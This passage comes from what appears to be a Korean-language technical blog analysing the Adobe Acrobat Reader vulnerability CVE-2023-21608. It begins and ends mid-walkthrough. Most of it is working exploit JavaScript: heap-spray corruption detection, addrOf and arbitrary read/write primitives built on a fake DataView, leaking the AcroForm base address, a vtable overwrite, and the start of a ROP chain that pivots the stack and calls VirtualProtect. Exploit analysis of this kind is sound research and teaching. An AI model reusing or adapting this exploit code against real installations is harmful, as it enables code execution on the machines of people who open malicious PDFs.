<span class="hljs-keyword">var</span> originalTargetStrAddr = <span class="hljs-number">0</span>,
    originalTargetDVAddr = <span class="hljs-number">0</span>;

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; bufs.length; i++) {
    <span class="hljs-keyword">if</span> (bufs[i].byteLength != ALLOC_SIZE) {
        <span class="hljs-built_in">console</span>.println(
            <span class="hljs-string">&quot;[+] corrupted array buffer found at &quot;</span> +
                i +
                <span class="hljs-string">&quot; : length: &quot;</span> +
                bufs[i].byteLength +
                <span class="hljs-string">&quot; : buf length: &quot;</span> +
                bufs.length
        );
        <span class="hljs-keyword">const</span> uintArr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(bufs[i]);

        <span class="hljs-built_in">console</span>.println(<span class="hljs-string">&quot;[*] checking leaked global array...&quot;</span>);

        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> x = ((bufs.length - i) * <span class="hljs-number">0xfff8</span>) / <span class="hljs-number">4</span>; x &lt; uintArr.length; x++) {
            <span class="hljs-keyword">if</span> (uintArr[x] == <span class="hljs-number">0x47484950</span>) {
                arrStart = x - <span class="hljs-number">4</span>;
                <span class="hljs-built_in">console</span>.println(<span class="hljs-string">&quot;[*] leaked global array found at index:&quot;</span> + arrStart);
                <span class="hljs-keyword">break</span>;
            }
        }

        <span class="hljs-comment">// store for recovery</span>
        originalTargetStrAddr = uintArr[arrStart + <span class="hljs-number">6</span>];
        originalTargetDVAddr = uintArr[arrStart + <span class="hljs-number">8</span>];

        <span class="hljs-comment">// corrupt for further primitives</span>
        uintArr[arrStart + <span class="hljs-number">4</span>] = <span class="hljs-number">0x47484951</span>;
        uintArr[arrStart + <span class="hljs-number">6</span>] = FAKE_STR;
        uintArr[arrStart + <span class="hljs-number">8</span>] = FAKE_DV;

        corruptedTypedArr = uintArr;

        <span class="hljs-keyword">break</span>;
    }
}</code></pre>
<p>&#xC2A4;&#xD504;&#xB808;&#xC774;&#xB41C; <code>ArrayBuffer</code>&#xB4E4;&#xC758; length&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xC5EC; &#xD560;&#xB2F9;&#xC5D0; &#xC0AC;&#xC6A9;&#xD55C; &#xD06C;&#xAE30;&#xC778; <code>ALLOC_SIZE</code>(0xffe8)&#xC640; &#xAC19;&#xC740;&#xC9C0; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; OOB Read/Write&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; <code>corruptedTypedArr</code>&#xB97C; &#xCC3E;&#xC544;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xC774;&#xB97C; &#xD1B5;&#xD574; <code>sprayArrBuffers</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB41C; &#xC778;&#xC811;&#xD55C; <code>Array</code>&#xB4E4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB41C; <code>Array</code>&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC640; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</p>
<pre><code class="hljs apache"><span class="hljs-attribute">24188270</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000</span>f<span class="hljs-number">80</span> <span class="hljs-number">00000</span>f<span class="hljs-number">80</span> <span class="hljs-number">00000</span>f<span class="hljs-number">80</span>  ................
<span class="hljs-attribute">24188280</span>  <span class="hljs-number">47484950</span> ffffff<span class="hljs-number">81</span> <span class="hljs-number">0</span>db<span class="hljs-number">3</span>c<span class="hljs-number">420</span> ffffff<span class="hljs-number">85</span>  PIHG.... .......
<span class="hljs-attribute">24188290</span>  <span class="hljs-number">0</span>dda<span class="hljs-number">27</span>c<span class="hljs-number">0</span> ffffff<span class="hljs-number">87</span> <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span>  .&apos;......QPQP....
<span class="hljs-attribute">241882a0</span>  <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span> <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span>  QPQP....QPQP....
<span class="hljs-attribute">241882b0</span>  <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span> <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span>  QPQP....QPQP....
<span class="hljs-attribute">241882c0</span>  <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span> <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span>  QPQP....QPQP....
<span class="hljs-attribute">241882d0</span>  <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span> <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span>  QPQP....QPQP....
<span class="hljs-attribute">241882e0</span>  <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span> <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span>  QPQP....QPQP....
</code></pre>
<p><code>Array</code>&#xC5D0;&#xB294; &#xB370;&#xC774;&#xD130; &#xAC12;&#xB9CC; &#xC800;&#xC7A5;&#xB418;&#xB294; <code>ArrayBuffer</code>&#xC640; &#xB2EC;&#xB9AC; &#xAC01; 4&#xBC14;&#xC774;&#xD2B8;&#xC758; &#xB370;&#xC774;&#xD130; &#xAC12;&#xACFC; &#xD0C0;&#xC785;&#xC744; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xD0DC;&#xADF8; &#xAC12;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; jsval&#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p>
<p>&#xC544;&#xB798;&#xB294;  Adobe Acrobat Reader&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; Javascript &#xC5D4;&#xC9C4;&#xC778; SpiderMonkey&#xC5D0;&#xC11C; jsval&#xC744; &#xD45C;&#xD604;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xB098;&#xD0C0;&#xB0B8; &#xADF8;&#xB9BC;&#xC785;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%206.png" srcset="/img/loading.gif" alt="Untitled"></p>
<blockquote>
<p>&#xADF8;&#xB9BC;.1: <a target="_blank" rel="external nofollow noopener noreferrer" href="https://downloads.immunityinc.com/infiltrate-archives/the_shadow_over_firefox_infiltrate_2015.pdf">&#xCD9C;&#xCC98;</a> Slide 10</p>
</blockquote>
<p>&#xC774;&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xC5EC; <code>Array</code>&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xBA74; <code>0db3c420 ffffff85</code>&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC778; <code>targetStr</code>&#xC774;&#xACE0; <code>0dda27c0 ffffff87</code>&#xB294; DataView&#xC778; <code>targetDV</code>&#xC778; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<h3 id="Corrupt-Sparyed-Array"><a href="#Corrupt-Sparyed-Array" class="headerlink" title="Corrupt Sparyed Array"></a>Corrupt Sparyed Array</h3><p>&#xBA3C;&#xC800; &#xBCC0;&#xC870;&#xB41C; <code>ArrayBuffer</code>&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xC811;&#xD55C; <code>Array</code>&#xB97C; &#xCC3E;&#xAE30; &#xC704;&#xD574; OOB Read&#xB97C; &#xD65C;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p>OOB Read&#xB85C; &#xC77D;&#xC740; &#xB370;&#xC774;&#xD130;&#xB97C; <code>Array[0]</code>&#xC5D0; &#xC704;&#xCE58;&#xD55C; 0x47484950&#xACFC; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD1B5;&#xD574; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB41C; <code>Array</code>&#xC784;&#xC744; &#xC2DD;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xACE0; OOB Read&#xC5D0; &#xC0AC;&#xC6A9;&#xB41C; &#xC778;&#xB371;&#xC2A4;&#xC5D0;&#xC11C; 4&#xB97C; &#xBE7C;&#xC11C; <code>Array</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xC8FC;&#xC18C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC778;&#xB371;&#xC2A4; <code>arrStart</code>&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p>&#xC774;&#xD6C4; &#xC544;&#xB798;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; <code>Array</code>&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xC5EC; <code>targetStr</code>&#xACFC; <code>targetDV</code>&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xAC01;&#xAC01; <code>FAKE_STR</code>&#xACFC; <code>FAKE_DV</code>&#xB85C; &#xBCC0;&#xC870;&#xD569;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs jsx">originalTargetStrAddr = uintArr[arrStart + <span class="hljs-number">6</span>];<span class="hljs-comment">// corrupted ArrayBuffer</span>
originalTargetDVAddr = uintArr[arrStart + <span class="hljs-number">8</span>];

<span class="hljs-comment">// corrupt for further primitives</span>
uintArr[arrStart + <span class="hljs-number">4</span>] = <span class="hljs-number">0x47484951</span>;
uintArr[arrStart + <span class="hljs-number">6</span>] = FAKE_STR; <span class="hljs-comment">// 0x20000058 + 0x100</span>
uintArr[arrStart + <span class="hljs-number">8</span>] = FAKE_DV; <span class="hljs-comment">//0x20000058 + 0x180</span>

corruptedTypedArr = uintArr;

</code></pre>
<p><code>FAKE_STR</code>&#xACFC; <code>FAKE_DV</code>&#xB294; &#xBCC0;&#xC870;&#xB41C; <code>ArrayBuffer</code>&#xC758; &#xB370;&#xC774;&#xD130; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xC778; 0x20000058&#xB85C;&#xBD80;&#xD130; &#xAC01;&#xAC01; 0x100, 0x180 &#xB9CC;&#xD07C; &#xB5A8;&#xC5B4;&#xC9C4; &#xC704;&#xCE58;&#xC5D0; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p>
<h2 id="3-AddrOf-amp-poi-Primitives"><a href="#3-AddrOf-amp-poi-Primitives" class="headerlink" title="3. AddrOf &amp; poi Primitives"></a>3. AddrOf &amp; poi Primitives</h2><h3 id="AddrOf-Primitive"><a href="#AddrOf-Primitive" class="headerlink" title="AddrOf Primitive"></a>AddrOf Primitive</h3><p>&#xC784;&#xC758;&#xC758; Javascript &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC720;&#xCD9C;&#xD558;&#xAE30; &#xC704;&#xD55C; addrof&#xB97C; &#xBCC0;&#xC870;&#xB41C; <code>ArrayBuffer</code>(<code>corruptedTypedArr</code>)&#xC640; <code>Array</code>(<code>modifiedArr</code>)&#xB97C; &#xD1B5;&#xD574; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
<pre><code class="hljs jsx"><span class="hljs-keyword">var</span> modifiedArr = <span class="hljs-literal">null</span>;

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; arrs.length; i++) {
    <span class="hljs-keyword">if</span> (arrs[i][<span class="hljs-number">0</span>] == <span class="hljs-number">0x47484951</span>) {
        modifiedArr = arrs[i];
        <span class="hljs-keyword">break</span>;
    }
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params">obj</span>) </span>{
    modifiedArr[<span class="hljs-number">0</span>] = obj;
    addr = corruptedTypedArr[arrStart + <span class="hljs-number">4</span>];
    <span class="hljs-keyword">return</span> addr;
}</code></pre>
<p>&#xC704; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB41C; <code>Array</code>&#xB4E4;&#xC744; &#xC21C;&#xD68C;&#xD558;&#xBA70; <code>Array[0]</code>&#xC774; &#xC6D0;&#xBCF8;&#xC778;  0x47484950&#xC774; &#xC544;&#xB2C8;&#xB77C; &#xBCC0;&#xC870;&#xB41C; 0x47484951&#xC778; <code>Array</code>&#xB97C; &#xCC3E;&#xC544;&#xB0B4;&#xACE0; &#xC774;&#xB97C; <code>modifiedArr</code>&#xC5D0; &#xB300;&#xC785;&#xD569;&#xB2C8;&#xB2E4;. <code>corruptedTypedArr[arrStart + 4]</code>&#xB85C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC73C;&#xBA74; <code>modifiedArr[0]</code>&#xC5D0; &#xC800;&#xC7A5;&#xB41C; jsval&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC77D;&#xD788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
<p><code>addrOf</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC5EC; <code>modifiedArr[0]</code>&#xC5D0; &#xC8FC;&#xC18C;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xB300;&#xC785;&#xD558;&#xACE0; <code>corruptedTypedArr[arrStart + 4]</code>&#xB85C; &#xC5EC;&#xAE30;&#xC5D0; &#xC4F0;&#xC778; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC77D;&#xC5B4; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p>
<h3 id="poi-Primitive"><a href="#poi-Primitive" class="headerlink" title="poi Primitive"></a>poi Primitive</h3><p><code>modifiedArr[1]</code>&#xC740; &#xC6D0;&#xBCF8; String &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xAC00; &#xC544;&#xB2CC; <code>corruptedTypedArr</code>&#xC5D0; &#xAD6C;&#xC131;&#xB41C; Fake String&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xC784;&#xC758;&#xC758; &#xC8FC;&#xC18C;&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xC77D;&#xC5B4;&#xC624;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;</p>
<pre><code class="hljs jsx"><span class="hljs-keyword">const</span> FAKE_STR_START = <span class="hljs-number">0x40</span>;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">s2h</span>(<span class="hljs-params">s</span>) </span>{
    <span class="hljs-keyword">var</span> n1 = s.charCodeAt(<span class="hljs-number">0</span>);
    <span class="hljs-keyword">var</span> n2 = s.charCodeAt(<span class="hljs-number">1</span>);
    <span class="hljs-keyword">return</span> ((n2 &lt;&lt; <span class="hljs-number">16</span>) | n1) &gt;&gt;&gt; <span class="hljs-number">0</span>;
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">poi</span>(<span class="hljs-params">addr</span>) </span>{
    <span class="hljs-comment">// leak values at addr by setting it to string ptr</span>
    corruptedTypedArr[FAKE_STR_START + <span class="hljs-number">1</span>] = addr;
    val = s2h(modifiedArr[<span class="hljs-number">1</span>]);
    <span class="hljs-keyword">return</span> val;
}</code></pre>
<p><code>poi</code>&#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>corruptedTypedArr</code>&#xC5D0; &#xAD6C;&#xC131;&#xB41C; Fake String&#xC758; &#xBB38;&#xC790;&#xC5F4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC744; &#xC8FC;&#xC18C;&#xB85C; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>modifiedArr[1]</code>&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74; Fake String&#xC774; &#xBC18;&#xD658;&#xB418;&#xACE0; &#xBCC0;&#xC870;&#xB41C; &#xC8FC;&#xC18C;&#xC5D0; &#xC704;&#xCE58;&#xD55C; &#xBB38;&#xC790;&#xC5F4;&#xC744; <code>s2h</code>&#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC22B;&#xC790;&#xB85C; &#xBCC0;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p>
<h2 id="4-Arbitrary-Address-Read-Write-Primitive"><a href="#4-Arbitrary-Address-Read-Write-Primitive" class="headerlink" title="4. Arbitrary Address Read/Write Primitive"></a>4. Arbitrary Address Read/Write Primitive</h2><p>&#xC704;&#xC5D0;&#xC11C; &#xAD6C;&#xD604;&#xB41C; <code>addrOf</code>, <code>poi</code>&#xB85C; Fake <code>DataView</code>&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC784;&#xC758; &#xC8FC;&#xC18C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;&#xB97C; &#xC704;&#xD55C; <code>AAR</code>, <code>AAW</code> &#xD568;&#xC218;&#xB97C; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs jsx"><span class="hljs-keyword">var</span> targetDV = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x64</span>));
targetDV.setUint32(<span class="hljs-number">0</span>, <span class="hljs-number">0x55555555</span>, <span class="hljs-literal">true</span>);
<span class="hljs-keyword">const</span> FAKE_DV_START = <span class="hljs-number">0x60</span>;
<span class="hljs-comment">//....</span>

<span class="hljs-keyword">var</span> targetDVPtr = addrOf(targetDV);
<span class="hljs-built_in">console</span>.println(<span class="hljs-string">&quot;[+] target dataview address: &quot;</span> + targetDVPtr.toString(<span class="hljs-number">16</span>));

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">32</span>; k++) {
    corruptedTypedArr[FAKE_DV_START + k] = poi(targetDVPtr + k * <span class="hljs-number">4</span>);
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">AAR</span>(<span class="hljs-params">addr</span>) </span>{
    corruptedTypedArr[FAKE_DV_START + <span class="hljs-number">20</span>] = addr;
    <span class="hljs-keyword">return</span> modifiedArr[<span class="hljs-number">2</span>].getUint32(<span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">AAW</span>(<span class="hljs-params">addr, value</span>) </span>{
    corruptedTypedArr[FAKE_DV_START + <span class="hljs-number">20</span>] = addr;
    modifiedArr[<span class="hljs-number">2</span>].setUint32(<span class="hljs-number">0</span>, value, <span class="hljs-literal">true</span>);
}</code></pre>
<p>Fake <code>DataView</code>&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBA3C;&#xC800; <code>addrOf</code>&#xB85C; &#xC6D0;&#xBCF8; <code>DataView</code>&#xC778; <code>targetDV</code>&#xC758; &#xC8FC;&#xC18C;(<code>targetDVptr</code>)&#xC744; &#xC54C;&#xC544;&#xB0C5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xC6D0;&#xBCF8;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; <code>poi</code>&#xB85C; &#xC77D;&#xC5B4; <code>corruptedTypedArr[FAKE_DV_START]</code>&#xC5D0; &#xBCF5;&#xC81C;&#xD558;&#xC5EC; Fake <code>DataView</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xC758;&#xB3C4;&#xCE58; &#xC54A;&#xC740; &#xB3D9;&#xC791;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</p>
<p><code>AAR</code>, <code>AAW</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>corruptedTypedArr[FAKE_DV_START + 20]</code>&#xC5D0; &#xC704;&#xCE58;&#xD55C; <code>DataView</code>&#xC758; <code>ArrayBuffer</code> &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC77D;&#xAC70;&#xB098; &#xC4F8; &#xC8FC;&#xC18C;&#xB85C; &#xBCC0;&#xC870;&#xD569;&#xB2C8;&#xB2E4;. &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>modifiedArr[2]</code>&#xB85C; Fake <code>DataView</code>&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xC5EC; <code>setUint32</code>&#xB098; <code>getUint32</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xC784;&#xC758;&#xC758; &#xC8FC;&#xC18C;&#xC5D0;&#xC11C; 4&#xBC14;&#xC774;&#xD2B8;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xAC70;&#xB098; &#xC4F0;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p>
<h2 id="5-Insert-ROP-Payload"><a href="#5-Insert-ROP-Payload" class="headerlink" title="5. Insert ROP Payload"></a>5. Insert ROP Payload</h2><p><code>addrOf</code>, <code>AAR</code>, <code>AAW</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBCA0;&#xC774;&#xC2A4; &#xC8FC;&#xC18C; &#xB4F1; &#xD544;&#xC694;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC720;&#xCD9C;&#xD558;&#xACE0; ROP &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0; vtable&#xC744; &#xBCC0;&#xC870;&#xD558;&#xC5EC; &#xC0BD;&#xC785;&#xD55C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xB3C4;&#xB85D; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p>
<h3 id="Leak-AcroForm-Base-Address"><a href="#Leak-AcroForm-Base-Address" class="headerlink" title="Leak AcroForm Base Address"></a>Leak AcroForm Base Address</h3><p>&#xBA3C;&#xC800; ROP &#xAC00;&#xC82F;&#xB4E4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xAE30; &#xC704;&#xD574; <code>AAR</code>&#xD568;&#xC218;&#xB85C; <code>textField</code>&#xC778; <code>f0</code>&#xB85C;&#xBD80;&#xD130; <code>AcroForm.API</code>&#xC758; &#xBCA0;&#xC774;&#xC2A4; &#xC8FC;&#xC18C;&#xB97C; &#xC720;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xBCC0;&#xC870;&#xD560; <code>field</code>&#xC758; vtable&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xACE0; Fake <code>DataView</code>&#xB97C; &#xAD6C;&#xC131;&#xD560; &#xB54C;&#xC640; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; vtable&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC5B4; <code>corruptedTypedArr</code>&#xC774; &#xC704;&#xCE58;&#xD55C; 0x20000158(<code>arrBufPtr + 0x100</code>)&#xC5D0; &#xBCF5;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs jsx"><span class="hljs-keyword">const</span> arrBufPtr = <span class="hljs-number">0x20000048</span> + <span class="hljs-number">0x10</span>;
<span class="hljs-keyword">var</span> AcroFormApiBase =
    AAR(AAR(addrOf(f0) + <span class="hljs-number">0x10</span>) + <span class="hljs-number">0x34</span>) - VersionData[curAppVersion][<span class="hljs-string">&quot;AcroFormOffset&quot;</span>];
<span class="hljs-built_in">console</span>.println(<span class="hljs-string">&quot;[+] AcroForm base leaked: &quot;</span> + AcroFormApiBase.toString(<span class="hljs-number">16</span>));

<span class="hljs-keyword">var</span> fieldVtblAddr = AAR(AAR(AAR(AAR(addrOf(f0) + <span class="hljs-number">0x10</span>) + <span class="hljs-number">0x10</span>) + <span class="hljs-number">0xc</span>) + <span class="hljs-number">4</span>);
<span class="hljs-keyword">var</span> fieldVtbl = AAR(fieldVtblAddr);

<span class="hljs-built_in">console</span>.println(
    <span class="hljs-string">&quot;[+] field vTable Addr: &quot;</span> +
        fieldVtblAddr.toString(<span class="hljs-number">16</span>) +
        <span class="hljs-string">&quot; | fieldVtable: &quot;</span> +
        fieldVtbl.toString(<span class="hljs-number">16</span>)
);
<span class="hljs-string">``</span><span class="hljs-string">``</span>
<span class="hljs-built_in">console</span>.println(<span class="hljs-string">&quot;[*] clone field vtable for overwriting defaultValue pointer&quot;</span>);

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) AAW(arrBufPtr + <span class="hljs-number">0x100</span> + i * <span class="hljs-number">4</span>, AAR(fieldVtbl + i * <span class="hljs-number">4</span>));

<span class="hljs-keyword">var</span> originalDefaulValFunc = AAR(arrBufPtr + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x48</span>);</code></pre>
<h3 id="Building-ROP-Chain-CFG-Bypass"><a href="#Building-ROP-Chain-CFG-Bypass" class="headerlink" title="Building ROP Chain : CFG Bypass"></a>Building ROP Chain : CFG Bypass</h3><pre><code class="hljs jsx">ROP = VersionData[curAppVersion][<span class="hljs-string">&quot;ROP&quot;</span>];
AAW(arrBufPtr + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x48</span>, AcroFormApiBase + ROP[<span class="hljs-number">0</span>]); <span class="hljs-comment">// ROP_s = AcroForm!sub_20EFAA60 ;</span>
AAW(arrBufPtr + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x30</span>, AcroFormApiBase + ROP[<span class="hljs-number">1</span>]); <span class="hljs-comment">// xchg eax, esp ; ret ;</span>
AAW(arrBufPtr + <span class="hljs-number">0x100</span>, AcroFormApiBase + ROP[<span class="hljs-number">2</span>]); <span class="hljs-comment">// pop esp ; ret ;</span>
AAW(arrBufPtr + <span class="hljs-number">0x100</span> + <span class="hljs-number">4</span>, arrBufPtr + <span class="hljs-number">0x300</span>); <span class="hljs-comment">// pivot to our _stack</span>
AAW(fieldVtblAddr, arrBufPtr + <span class="hljs-number">0x100</span>); <span class="hljs-comment">// overwrite field vtable to our ROP start</span>

<span class="hljs-built_in">console</span>.println(<span class="hljs-string">&quot;[*] storing recovery context!&quot;</span>);
AAW(arrBufPtr + <span class="hljs-number">0x300</span> + <span class="hljs-number">0x60</span>, fieldVtblAddr); <span class="hljs-comment">// original vtable ptr (goes back in ecx)</span>
AAW(arrBufPtr + <span class="hljs-number">0x300</span> + <span class="hljs-number">0x64</span>, fieldVtbl); <span class="hljs-comment">// vtable funcs ptr</span>
AAW(arrBufPtr + <span class="hljs-number">0x300</span> + <span class="hljs-number">0x68</span>, originalDefaulValFunc); <span class="hljs-comment">// original defaultVal impl to jump to</span>
AAW(arrBufPtr + <span class="hljs-number">0x300</span> + <span class="hljs-number">0x6c</span>, AAR(ARR_BUF_BASE + <span class="hljs-number">8</span>)); <span class="hljs-comment">// corrupted arrbuf typed array ptr</span>
AAW(arrBufPtr + <span class="hljs-number">0x300</span> + <span class="hljs-number">0x70</span>, AAR(ARR_BUF_MALLOC_BASE)); <span class="hljs-comment">// malloc header 0</span>
AAW(arrBufPtr + <span class="hljs-number">0x300</span> + <span class="hljs-number">0x74</span>, AAR(ARR_BUF_MALLOC_BASE + <span class="hljs-number">4</span>)); <span class="hljs-comment">// malloc header 1</span>

<span class="hljs-keyword">var</span> rop = [
    AAR(AcroFormApiBase + VersionData[curAppVersion][<span class="hljs-string">&quot;VirtualProtect&quot;</span>]), <span class="hljs-comment">// VirtualProtect</span>
    arrBufPtr + <span class="hljs-number">0x400</span>, <span class="hljs-comment">// return address</span>
    arrBufPtr + <span class="hljs-number">0x400</span>, <span class="hljs-comment">// buffer</span>
    <span class="hljs-number">0x1000</span>, <span class="hljs-comment">// sz</span>
    <span class="hljs-number">0x40</span>, <span class="hljs-comment">// new protect</span>
    arrBufPtr + <span class="hljs-number">0x540</span> <span class="hljs-comment">// old protect</span>
];

